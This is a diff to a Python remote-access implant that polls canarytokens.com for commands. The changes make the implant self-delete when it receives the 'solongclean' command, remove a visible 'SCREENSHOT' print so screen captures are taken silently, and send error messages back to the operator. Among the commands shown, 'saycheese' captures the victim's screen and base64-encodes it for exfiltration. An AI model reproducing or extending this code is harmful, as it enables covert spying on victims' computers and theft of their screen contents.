@@ -154,10 +154,10 @@ def connect(url,managementURL):
             if cmd.startswith("solongdirty:"):
                 sys.exit(1)
 
-            if cmd.startswith("solongsoclean:"):
+            if cmd.startswith("solongclean:"):
                 # process and delete itself
                 dir = os.getcwd()
-                #os.remove(dir + '\%s' % sys.argv[0])
+                os.remove(dir + '\%s' % sys.argv[0])
 
         command = decodelist[-1]
 
@@ -200,7 +200,6 @@ def connect(url,managementURL):
             b64 = base64.b64encode(combined.encode('UTF-8'))
 
         elif command.startswith("saycheese:"):
-            print("SCREENSHOT")
             screenshotwarning = True
             maxlen = 315000
             with mss.mss() as sct:
@@ -258,8 +257,8 @@ def connect(url,managementURL):
             #print(str(len(b64)))
 
     except Exception as e:
-        #output = "res:Error with last ran command: " + str(e)
-        #b64 = base64.b64encode(output.encode('UTF-8'))
+        output = "res:Error with last ran command: " + str(e)
+        b64 = base64.b64encode(output.encode('UTF-8'))
         #exc_type, exc_obj, exc_tb = sys.exc_info()
         #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
         #print(exc_type, fname, exc_tb.tb_lineno)
@@ -368,7 +367,8 @@ def main():
     path = random.choice(canaryPath)
     endpoint = random.choice(canaryEndpoint)
 
-    url = ("http://canarytokens.com/" + path + "/" + canaryManagementURL[canaryManagementURL.index(start) + len(start):                                                  canaryManagementURL.index(end)] + "/" + endpoint)
+    url = ("http://canarytokens.com/" + path + "/" + canaryManagementURL[canaryManagementURL.index(start) + len(start):
+                                                                         canaryManagementURL.index(end)] + "/" + endpoint)
     checkin(url)
 
     while True:
